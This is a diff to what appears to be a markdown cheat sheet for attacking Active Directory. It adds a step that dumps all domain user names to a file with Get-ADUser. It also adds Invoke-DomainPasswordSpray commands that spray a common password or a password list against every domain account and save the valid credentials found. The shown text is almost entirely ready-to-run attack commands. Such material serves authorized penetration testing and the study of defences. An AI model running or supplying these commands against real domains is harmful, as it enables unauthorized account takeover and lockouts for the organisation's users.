@@ -30,7 +30,13 @@
 
 #### 2) Using DomainPasswordSpray to spray a password against all users of a domain https://github.com/dafthack/DomainPasswordSpray
 
-    Invoke-DomainPasswordSpray -Password Summer2021! (Automatically creates a userlist from the users in the domain and sprays the password)
+Create a userlist 
+
+    Get-ADUser -Properties name -Filter * | Select-Object -ExpandProperty name | Out-File users.txt 
+
+Use Invoke-DomainPasswordSpray
+
+    Invoke-DomainPasswordSpray -Password Summer2021! -Verbose (Automatically creates a userlist from the users in the domain and sprays the password)
 
     Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
 
